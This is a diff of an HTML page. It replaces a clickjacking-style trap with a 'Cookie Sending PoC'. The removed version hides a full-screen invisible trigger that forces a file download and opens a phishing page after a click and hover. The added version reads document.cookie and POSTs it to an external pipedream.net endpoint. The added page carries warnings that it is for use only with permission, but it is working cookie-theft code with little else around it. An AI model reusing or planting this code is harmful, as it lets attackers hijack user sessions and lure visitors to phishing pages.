@@ -1,37 +1,73 @@
-
-<html>
-  <body>
-    <p>Click anywhere, then hover over the invisible area to trigger a **forced PDF download** or a **phishing page** without any additional confirmation.</p>
-
-    <!-- Invisible area that triggers the action -->
-    <div id="trap" style="width:100vw; height:100vh; position:absolute; top:0; left:0;">
-      <div id="hiddenTrigger" style="position:absolute; top:50%; left:50%; width:0; height:0; background:transparent;"></div>
-    </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Sending PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        #output {
+            margin-top: 20px;
+            color: green;
+        }
+        #error {
+            margin-top: 20px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Cookie Sending PoC</h1>
+    <p>This demo captures real cookies and sends them to a test server. Use only with explicit permission!</p>
+    <button onclick="sendCookies()">Send Real Cookies</button>
+    <div id="output"></div>
+    <div id="error"></div>
 
     <script>
-      let isClick = false;
+        // WARNING: This code captures REAL cookies and sends them to an external server.
+        // ONLY use this on systems YOU OWN or have WRITTEN PERMISSION to test.
+        // Unauthorized cookie theft is ILLEGAL and can lead to serious consequences.
+        function sendCookies() {
+            // Capture real cookies
+            const realCookies = document.cookie || "No cookies found";
 
-      // Activate action upon any click on the page
-      document.body.addEventListener('click', () => {
-        isClick = true;
-      });
+            // Display what's being sent (for transparency)
+            document.getElementById("output").innerText = 
+                "Preparing to send cookies: " + realCookies;
 
-      // Once the hidden element is hovered, trigger the unwanted action (forced PDF download or phishing)
-      document.getElementById('hiddenTrigger').addEventListener('mouseenter', () => {
-        if (isClick) {
-          // Example: Forced PDF download (replace with an actual PDF link)
-          const a = document.createElement('a');
-          a.href = 'https://www.adobe.com/support/products/enterprise/pdfs/acrobatpro.pdf'; // Example: Link to an Adobe PDF
-          a.download = 'acrobatpro.pdf';  // Initiates the download
-          a.click();
-
-          // Example: Open phishing page
-          window.open('https://example.com/phishing-page', '_blank');
-
-          isClick = false;  // Prevent triggering more than once
+            // Send cookies to the provided URL
+            fetch("https://eoy4evvlsf7y0jq.m.pipedream.net/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    cookies: realCookies,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("output").innerText = 
+                        "Cookies sent successfully: " + realCookies;
+                } else {
+                    throw new Error("Server responded with status: " + response.status);
+                }
+            })
+            .catch(error => {
+                document.getElementById("error").innerText = 
+                    "Error sending cookies: " + error.message;
+            });
         }
-      });
     </script>
-  </body>
+</body>
 </html>
-
